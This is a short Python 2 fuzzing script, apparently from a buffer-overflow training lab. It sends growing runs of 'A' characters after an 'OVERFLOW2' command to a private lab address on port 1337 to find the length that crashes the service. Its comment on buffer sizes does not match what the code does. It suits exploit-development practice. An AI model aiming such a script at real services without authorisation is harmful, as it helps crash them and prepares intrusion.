import socket

# Create an array of buffers, from 10 to 2000, with increments of 20.
counter = 100
fuzz_strings = ["A"]

while len(fuzz_strings) <= 30:
    fuzz_strings.append("A" * counter)
    counter = counter + 200

for fuzz in fuzz_strings:
    print "Fuzzing with %s bytes" % len(fuzz)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('10.10.140.221', 1337))
    s.send('OVERFLOW2 ' + fuzz + '\r\n\r\n' )
    print s.recv(1024)
    s.close()

#ip=10.10.140.221